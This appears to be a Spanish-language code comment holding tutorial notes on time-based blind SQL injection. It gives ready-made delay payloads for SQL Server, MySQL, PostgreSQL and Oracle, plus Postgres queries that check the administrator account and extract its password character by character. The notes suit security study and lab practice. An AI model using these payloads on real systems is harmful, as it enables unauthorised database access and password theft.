/*
Explotación de inyección SQL ciega mediante la activación de retrasos de tiempo

Si la aplicación captura los errores de la base de datos cuando se ejecuta la consulta SQL y los maneja de manera adecuada,
no habrá ninguna diferencia en la respuesta de la aplicación. Esto significa que la técnica anterior para inducir errores condicionales no funcionará.

En esta situación, a menudo es posible explotar la vulnerabilidad de inyección SQL ciega activando retrasos de tiempo dependiendo
de si una condición inyectada es verdadera o falsa. Dado que las consultas SQL normalmente se procesan de manera sincrónica por la aplicación,
retrasar la ejecución de una consulta SQL también retrasa la respuesta HTTP. Esto te permite determinar la veracidad de la condición
inyectada en función del tiempo que tarda en recibirse la respuesta HTTP.


Las técnicas para activar un retraso de tiempo son específicas del tipo de base de datos que se está utilizando.
Por ejemplo, en Microsoft SQL Server, puedes usar lo siguiente para probar una condición y activar un retraso dependiendo de si la expresión es verdadera:

'; IF (1=2) WAITFOR DELAY '0:0:10'-- '   -> el ; se debe reemplazar por %3B porque ; es el separador de los atributos del cookie
'; IF (1=1) WAITFOR DELAY '0:0:10'-- '   -> el ; se debe reemplazar por %3B porque ; es el separador de los atributos del cookie

La primera de estas entradas no activa un retraso, porque la condición 1=2 es falsa. La segunda entrada activa un retraso de 10 segundos,
porque la condición 1=1 es verdadera. Usando esta técnica, podemos recuperar datos probando un carácter a la vez:

'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

Nota
Hay varias formas de activar retrasos de tiempo dentro de consultas SQL, y diferentes técnicas se aplican a diferentes tipos de bases de datos.
Para más detalles, consulta la hoja de trucos de inyección SQL.


x' %3B SELECT IF(1=1,SLEEP(10),'a') -- '    -> MySQL
x' %3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END -- '    -> Postgress
x' %3B IF (1=1) WAITFOR DELAY '0:0:10' -- '   -> Microsoft
x' %3B SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual -- '   -> Oracle


Verificamos si la tabla existe:
x' %3B SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- '     -> Postgress

Verificamos largo del password:
x' %3B SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--      -> Postgress

Verificamos el pass de manera iterativa:
x' %3B SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--      -> Postgress

*/